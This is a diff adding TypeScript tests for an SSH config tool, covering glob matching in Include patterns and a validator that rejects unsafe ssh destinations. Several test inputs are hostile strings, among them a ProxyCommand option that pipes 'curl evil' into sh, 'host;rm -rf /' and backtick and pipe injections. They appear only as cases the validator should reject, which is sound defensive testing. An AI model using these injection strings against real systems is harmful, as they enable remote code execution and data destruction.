@@ -1,4 +1,5 @@
-import { parseSshConfig } from "../sshConfig.ts";
+import { parseSshConfig, matches } from "../sshConfig.ts";
+import { isSafeDestination } from "../remote.ts";
 
 let pass = 0;
 let fail = 0;
@@ -97,6 +98,34 @@ eq("several includes on one line", parseSshConfig("Include a b\n").includes, ["a
 
 eq("an empty config has no hosts", parseSshConfig("").hosts, []);
 eq("a keyword with no value is skipped", aliases("Host\nHost build\n"), ["build"]);
+
+// `Include ~/.ssh/config.d/*` is the standard idiom; treating it as a literal
+// filename found nothing and hid the whole feature.
+eq("a star matches anything", matches("work", "*"), true);
+eq("a star with a prefix", matches("config-work", "config-*"), true);
+eq("a star does not cross a separator", matches("a/b", "a*"), false);
+eq("a question mark is one character", matches("cfg1", "cfg?"), true);
+eq("and only one", matches("cfg12", "cfg?"), false);
+eq("a dot is a dot, not any character", matches("configXd", "config.d"), false);
+eq("an exact name still matches", matches("config.d", "config.d"), true);
+eq("no accidental substring match", matches("myconfig", "config"), false);
+
+// The ssh destination reaches the engine from a POST any page in the browser
+// can make, and goes straight into ssh's argv, where there is no quoting to
+// hide behind.
+eq("a plain alias", isSafeDestination("build"), true);
+eq("user@host", isSafeDestination("adri@adri-web.dev"), true);
+eq("an address", isSafeDestination("adri@10.0.0.4"), true);
+eq("bracketed IPv6", isSafeDestination("[fe80::1]"), true);
+
+eq("a leading dash is an ssh option", isSafeDestination("-oProxyCommand=x"), false);
+eq("the ProxyCommand attack", isSafeDestination('-oProxyCommand=sh -c "curl evil|sh"'), false);
+eq("no spaces", isSafeDestination("host with space"), false);
+eq("no shell metacharacters", isSafeDestination("host;rm -rf /"), false);
+eq("no backticks", isSafeDestination("host`id`"), false);
+eq("no pipes", isSafeDestination("host|sh"), false);
+eq("no newlines", isSafeDestination("host\nother"), false);
+eq("not empty", isSafeDestination(""), false);
 
 console.log(`\n${pass} passed, ${fail} failed`);
 // exitCode, not exit(): exit() can abort a queued stdout write on Windows.
